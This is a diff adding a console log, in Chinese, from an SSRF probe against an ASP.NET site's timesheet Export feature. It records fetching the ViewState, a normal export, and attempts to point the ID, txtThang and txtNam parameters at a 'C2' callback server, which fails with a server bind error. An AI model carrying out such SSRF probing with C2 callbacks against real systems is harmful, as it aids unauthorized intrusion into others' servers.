@@ -1,0 +1,48 @@
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔥 测试Export功能 - SSRF探测
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[*] 在C2服务器启动HTTP服务器...
+
+[1] 获取ViewState和表单参数...
+ViewState: /wEPDwULLTE4MzUzOTEyODUPZBYCAgMPZBYKAgEPDxYCHgRUZX...
+
+[2] 测试正常Export...
+响应头:
+HTTP/1.1 200 OK
+Cache-Control: no-cache
+Pragma: no-cache
+Content-Type: application/vnd.xls
+Expires: -1
+Server: Microsoft-IIS/10.0
+content-disposition: attachment;filename=chamcong.xls
+X-AspNet-Version: 4.0.30319
+X-Powered-By: ASP.NET
+Date: Mon, 17 Nov 2025 16:13:14 GMT
+Content-Length: 5614
+
+
+响应大小: 5614 bytes
+✅ 返回了文件 (可能是Excel/PDF)
+
+[3] 测试SSRF - ID参数指向C2...
+[*] 检查C2服务器日志...
+⚠️  C2未收到请求
+
+[4] 测试其他参数SSRF...
+测试参数: txtThang
+测试参数: txtNam
+C2最新日志:
+    with ServerClass(addr, HandlerClass) as httpd:
+  File "/usr/lib/python3.10/socketserver.py", line 452, in __init__
+    self.server_bind()
+  File "/usr/lib/python3.10/http/server.py", line 1301, in server_bind
+    return super().server_bind()
+  File "/usr/lib/python3.10/http/server.py", line 137, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib/python3.10/socketserver.py", line 466, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+SSRF测试完成
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
